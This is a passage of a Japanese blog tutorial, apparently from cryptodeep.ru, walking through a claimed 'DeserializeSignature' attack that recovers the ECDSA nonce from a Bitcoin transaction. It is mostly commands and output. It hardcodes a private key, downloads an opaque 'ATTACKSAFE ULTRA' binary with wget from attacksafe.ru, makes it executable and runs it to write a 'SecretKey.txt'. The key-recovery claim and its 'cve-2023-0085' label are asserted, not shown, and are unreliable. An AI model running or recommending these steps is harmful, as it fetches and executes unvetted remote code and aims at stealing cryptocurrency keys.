<!-- wp:image {"id":4733,"linkDestination":"custom"} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/04/image-8-1024x495.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-4733"/><figcaption class="wp-element-caption"><a href="https://github.com/smartiden/Broadcast-Bitcoin-Transaction/blob/main/requirements.txt" target="_blank" rel="noreferrer noopener"><strong>要件.txt</strong></a></figcaption></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>コマンドを実行しましょう:</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>pip install -r requirements.txt</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://keyhunters.ru/the-benefits-of-the-popular-notepad-program/" target="_blank" rel="noreferrer noopener">Notepad&nbsp;</a><a href="https://keyhunters.ru/the-benefits-of-the-popular-notepad-program/">++</a>でメイン ファイルを開き、Python スクリプト コード<strong><a href="https://github.com/smartiden/Broadcast-Bitcoin-Transaction/blob/main/main.py" target="_blank" rel="noreferrer noopener">main.pyに小さな変更を加えてみましょう。</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>from io import BytesIO
from secp256k1 import *
from sighash import *

pk = PrivateKey.parse("5HrVy4SVvC46tsuBhMhVEGHXG4AzhxtEqi4FLbia5vAXuF5GwaX")
pk.address()
tx = bytes.fromhex("35591e5c7f4f1f0e4d81748042f2a4b7dcae3ae01027f361cad7c8746369bc0d")
index = 0
send = "1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk"
tx_in = TxIn(tx, index, b'', 0xffffffff)
tx_in._script_pubkey = Tx.get_address_data(pk.address())&#91;'script_pubkey']
tx_in._value = 2345
tx_ins = &#91; tx_in ]
tx_outs = &#91;
    TxOut(1234, Tx.get_address_data(send)&#91;'script_pubkey'].serialize())
]
tx = Tx(1, tx_ins, tx_outs, 0, testnet=True)
signature(tx, 0, pk)
tx.serialize().hex()
print(tx.serialize().hex())
f = open("RawTX.txt", 'w')
f.write("" + tx.serialize().hex() + "" + "\n")
f.close()</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>コマンドを実行しましょう:</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>python main.py</strong></code></pre>
<!-- /wp:code -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>脆弱なトランザクションが作成されました。</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>ディレクトリ内の RawTX ファイルを開いてみましょう。</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>01000000010dbc696374c8d7ca61f32710e03aaedcb7a4f2428074814d0e1f4f7f5c1e5935000000008b483045022100b44a31bd81d3c596cc4d3776263229b6f52f2a729fbcafefffc9a0d955d46307022074e5feb333400732256fc44a681a1ba262b080a7cc5dfa11894e7ce4d9766c6f0141045cf7dd1ad49af6957415d6b76ff39cbf78f6e72f1db9199a01127687e7230f96614ff6f0184d2191fa7428872e311fe4ddf2b91f560b30fd7dc01d2118ac0b5bffffffff01d2040000000000001976a914d74b32dfa340da479ce64aaf5e326496eb3995f188ac00000000</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">ビデオ内のアクションの順序:</h2>
<!-- /wp:heading -->

<!-- wp:paragraph {"align":"center"} -->
<p class="has-text-align-center"><iframe width="560" height="315" src="https://www.youtube.com/embed/is1oUSCFJms?si=IKFpmucNzE-EoYO7" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><em><a href="https://colab.research.google.com/drive/1-3WyUqipb1pXrlDjg4jxtMOG6J3MU3sa" target="_blank" rel="noreferrer noopener"><strong>BitcoinChatGPT</strong></a>モジュールの<a href="https://colab.research.google.com/drive/1-3WyUqipb1pXrlDjg4jxtMOG6J3MU3sa" target="_blank" rel="noreferrer noopener">プロンプト応答</a>からわかるように、&nbsp;<strong><a href="https://github.com/BitcoinChatGPT/DeserializeSignature-Vulnerability-Algorithm" target="_blank" rel="noreferrer noopener">DeserializeSignature</a></strong>脆弱性を特定するアルゴリズムは、複雑な暗号化問題を解決するためのいくつかのオプションに使用できます<a href="https://colab.research.google.com/drive/1-3WyUqipb1pXrlDjg4jxtMOG6J3MU3sa" target="_blank" rel="noreferrer noopener"><strong></strong></a><strong><a href="https://github.com/BitcoinChatGPT/DeserializeSignature-Vulnerability-Algorithm" target="_blank" rel="noreferrer noopener"></a></strong></em>&nbsp;<em>。</em></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><a href="https://keyhunters.ru/nonce-bitcoin/" target="_blank" rel="noreferrer noopener">ビットコインブロックチェーンの秘密鍵「K」（NONCE）が暴露される</a></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":5306,"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://colab.research.google.com/drive/1EiIIJh8UCOZZ8DVbelxhESFPvqu_xZUo" target="_blank" rel="noreferrer noopener"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-42-1024x495.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5306"/></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://colab.research.google.com/drive/1EiIIJh8UCOZZ8DVbelxhESFPvqu_xZUo">https://colab.research.google.com/drive/1EiIIJh8UCOZZ8DVbelxhESFPvqu_xZUo</a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong><a href="https://colab.research.google.com/" target="_blank" rel="noreferrer noopener">【GoogleColab】</a></strong>を開いてみましょう&nbsp;<strong><a href="https://colab.research.google.com/" target="_blank" rel="noreferrer noopener"></a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/CryptoDeepTools/tree/main/32DeserializeSignatureVulnerability" target="_blank" rel="noreferrer noopener"><strong>32DeserializeSignatureVulnerability</strong></a>リポジトリを使用してアルゴリズムを実装しましょう<a href="https://github.com/demining/CryptoDeepTools/tree/main/32DeserializeSignatureVulnerability" target="_blank" rel="noreferrer noopener"><strong></strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!git clone https://github.com/demining/CryptoDeepTools.git

cd CryptoDeepTools/32DeserializeSignatureVulnerability/

ls</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5200} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-12-1024x660.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5200"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">RawTX を攻撃用に準備しましょう</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"></h2>
<!-- /wp:heading -->

<!-- wp:heading -->
<h2 class="wp-block-heading">次に、すべての脆弱なトランザクションから R、S、Z の値全体を取得する必要があります。</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>サービスを使ってみましょう:&nbsp;<a href="https://attacksafe.ru/RSZ-Signature-From-Tx" target="_blank" rel="noreferrer noopener"><strong>https://攻撃安全.ru/RSZ- Signature-From-Tx</strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>01000000010dbc696374c8d7ca61f32710e03aaedcb7a4f2428074814d0e1f4f7f5c1e5935000000008b483045022100b44a31bd81d3c596cc4d3776263229b6f52f2a729fbcafefffc9a0d955d46307022074e5feb333400732256fc44a681a1ba262b080a7cc5dfa11894e7ce4d9766c6f0141045cf7dd1ad49af6957415d6b76ff39cbf78f6e72f1db9199a01127687e7230f96614ff6f0184d2191fa7428872e311fe4ddf2b91f560b30fd7dc01d2118ac0b5bffffffff01d2040000000000001976a914d74b32dfa340da479ce64aaf5e326496eb3995f188ac00000000</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5152,"linkDestination":"custom"} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-10-1024x429.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5152"/><figcaption class="wp-element-caption"><a href="https://attacksafe.ru/RSZ-Signature-From-Tx" target="_blank" rel="noreferrer noopener"><strong>RSZ-Signature-From-Tx</strong></a></figcaption></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>R = 0xb44a31bd81d3c596cc4d3776263229b6f52f2a729fbcafefffc9a0d955d46307
S = 0x74e5feb333400732256fc44a681a1ba262b080a7cc5dfa11894e7ce4d9766c6f
Z = 0xa79974cb42f82890fcebcb9865cd512a34479d91211e2ce383def10a7388cf63</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong></strong><strong><a href="https://attacksafe.ru/ultra" target="_blank" rel="noreferrer noopener">攻撃を実行して秘密鍵を取得するには、 「ATTACKSAFE ULTRA」</a></strong><strong>ソフトウェアを使用します。</strong><strong><a href="https://attacksafe.ru/ultra" target="_blank" rel="noreferrer noopener"></a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5137,"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://attacksafe.ru/ultra" target="_blank" rel="noreferrer noopener"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-ultra.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5137"/></a><figcaption class="wp-element-caption"><strong><code>www.attacksafe.ru/ultra</code></strong></figcaption></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><a href="https://attacksafe.ru/ultra" target="_blank" rel="noreferrer noopener">「ATTAKSAFE ULTRA」</a>ソフトウェアの動作に必要なライブラリパッケージは<a href="https://cryptodeeptech.ru/install-sagemath-in-google-colab" target="_blank" rel="noreferrer noopener">「SAGE MATH」</a>をインストールしてください。<a href="https://cryptodeeptech.ru/install-sagemath-in-google-colab" target="_blank" rel="noreferrer noopener"></a></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":2188} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-27.png" alt="ツイスト攻撃の例その 1 一連の ECC 操作を実行して、ビットコイン ウォレットの秘密キーの値を取得します。" class="wp-image-2188"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":2189} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-28-1024x445.png" alt="ツイスト攻撃の例その 1 一連の ECC 操作を実行して、ビットコイン ウォレットの秘密キーの値を取得します。" class="wp-image-2189"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">インストールコマンド:</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!sudo apt-get update
!sudo apt-get install -y python3-gmpy2
!sudo apt-get install sagemath</strong>
</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5205} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-13-1024x442.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5205"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!sage -v</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5207} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-14.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5207"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://keyhunters.ru/what-is-wget/" target="_blank" rel="noreferrer noopener"><strong>wget</strong>&nbsp;</a>ユーティリティを使用して、&nbsp;<strong><a href="https://attacksafe.ru/REPOSITORY/DC66398E76DBCD8193134381D7838A02/ATTACKSAFE_ULTRA.zip" target="_blank" rel="noreferrer noopener">ATTACKSAFE_ULTRA.zip</a></strong>リポジトリを<strong><a href="https://colab.research.google.com/drive/1EiIIJh8UCOZZ8DVbelxhESFPvqu_xZUo" target="_blank" rel="noreferrer noopener">Google Colab</a></strong>フォルダにダウンロードします。<strong><a href="https://attacksafe.ru/REPOSITORY/DC66398E76DBCD8193134381D7838A02/ATTACKSAFE_ULTRA.zip" target="_blank" rel="noreferrer noopener"></a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!wget https://attacksafe.ru/REPOSITORY/DC66398E76DBCD8193134381D7838A02/ATTACKSAFE_ULTRA.zip</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5208} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-15-1024x283.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5208"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>リポジトリ<strong><a href="https://attacksafe.ru/REPOSITORY/DC66398E76DBCD8193134381D7838A02/ATTACKSAFE_ULTRA.zip" target="_blank" rel="noreferrer noopener">ATTACKSAFE_ULTRA.zipを解凍します。</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!unzip ATTACKSAFE_ULTRA.zip</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5209} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-16-1024x440.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5209"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>ls</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5213} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-17-1024x768.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5213"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5215} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-18-1024x528.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5215"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5216} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-19-1024x537.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5216"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5217} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-20-1024x526.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5217"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5218} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-21-1024x414.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5218"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!./attacksafe -help</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5221} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-22.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5221"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>  -version:  software version 
  -list:     list of bitcoin attacks
  -tool:     indicate the attack
  -gpu:      enable gpu
  -time:     work timeout
  -server:   server mode
  -port:     server port
  -open:     open file
  -save:     save file
  -search:   vulnerability search
  -stop:     stop at mode
  -max:      maximum quantity in mode
  -min:      minimum quantity per mode
  -speed:    boost speed for mode
  -range:    specific range
  -crack:    crack mode
  -field:    starting field
  -point:    starting point
  -inject:   injection regimen
  -decode:   decoding mode</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!./attacksafe -version</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5224} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-24.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5224"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">すべての攻撃スクリプトのリストを実行してみましょう。</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!./attacksafe -ultra</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5238} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-25-1024x706-SAVE.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5238"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":5231} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-27-1024x768.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5231"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":5234} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-28-1024x750.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5234"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":5237} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-29-1024x771.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5237"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">アクセス権：</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!chmod +x attacksafe</strong></code></pre>
<!-- /wp:code -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>ls -l</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5239} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-30-1024x436.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5239"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">応用：</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>選びましょう<code><strong>deserialization_error_vulnerability_cve-2023-0085.sage</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>脆弱なECDSA</strong>署名トランザクションから秘密キーを取得するには、データを<strong><code>RawTX</code>&nbsp;</strong>テキスト ドキュメントに追加し、ファイルとして保存します。<code><strong>RawTX.txt</strong></code>&nbsp;これにはユーティリティを使用します。&nbsp;<code>echo</code></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em><strong>コマンドを実行しましょう:</strong></em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!echo '01000000010dbc696374c8d7ca61f32710e03aaedcb7a4f2428074814d0e1f4f7f5c1e5935000000008b483045022100b44a31bd81d3c596cc4d3776263229b6f52f2a729fbcafefffc9a0d955d46307022074e5feb333400732256fc44a681a1ba262b080a7cc5dfa11894e7ce4d9766c6f0141045cf7dd1ad49af6957415d6b76ff39cbf78f6e72f1db9199a01127687e7230f96614ff6f0184d2191fa7428872e311fe4ddf2b91f560b30fd7dc01d2118ac0b5bffffffff01d2040000000000001976a914d74b32dfa340da479ce64aaf5e326496eb3995f188ac00000000' &gt; RawTX.txt
!cat RawTX.txt</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5241} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-32-1024x261.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5241"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><code><strong>deserialization_error_vulnerability_cve-2023-0085.sage</strong></code>ソフトウェアを使って起動してみましょう<code>“ATTACKSAFE&nbsp;ULTRA”</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!./attacksafe deserialization_error_vulnerability_cve-2023-0085.sage -open RawTX.txt -save SecretKey.txt</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5242} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-33-1024x435.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5242"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>この攻撃は次から開始され<code><strong>deserialization_error_vulnerability_cve-2023-0085.sage</strong></code>、結果はファイルに保存されました。<code><strong>SecretKey.txt</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>成功した結果を確認するには、ファイルを開いてください。<code><strong>SecretKey.txt</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>cat SecretKey.txt</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5243} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-34-1024x223.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5243"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":5244} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-35-1024x292.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5244"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>Deployments ECDSA:

SecretKey = 0x2863763e8ec6bf755cc152e5080e7c74a95295f06cfbe86d9cb7c37f28f1013c

RawTX = 01000000010dbc696374c8d7ca61f32710e03aaedcb7a4f2428074814d0e1f4f7f5c1e5935000000008b483045022100b44a31bd81d3c596cc4d3776263229b6f52f2a729fbcafefffc9a0d955d46307022074e5feb333400732256fc44a681a1ba262b080a7cc5dfa11894e7ce4d9766c6f0141045cf7dd1ad49af6957415d6b76ff39cbf78f6e72f1db9199a01127687e7230f96614ff6f0184d2191fa7428872e311fe4ddf2b91f560b30fd7dc01d2118ac0b5bffffffff01d2040000000000001976a914d74b32dfa340da479ce64aaf5e326496eb3995f188ac00000000</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><code>"Deployments ECDSA"</code>ビットコインブロックチェーントランザクションの重大な脆弱性を意味する碑文が見られる</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>SecretKey&nbsp;</code>形式の値<code>HEX</code>。これは秘密鍵です<code>"K" (NONCE)</code>。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code><strong>K = 0x2863763e8ec6bf755cc152e5080e7c74a95295f06cfbe86d9cb7c37f28f1013c</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><em>Python</em>スクリプトを使って確認してみます<code>point2gen.py</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>これを行うには、<a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>ECPy</strong></a>楕円曲線ライブラリをインストールします。</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!pip3 install ECPy</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5247} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-36-1024x325.png" alt="ビットコインネットワークにおける DeserializeSignature の脆弱性: 暗号解析、その結果、無効な ECDSA 署名が作成される可能性" class="wp-image-5247"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>次に、秘密キーを指定してスクリプトを実行しましょう<code>"K" (NONCE)</code>。</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
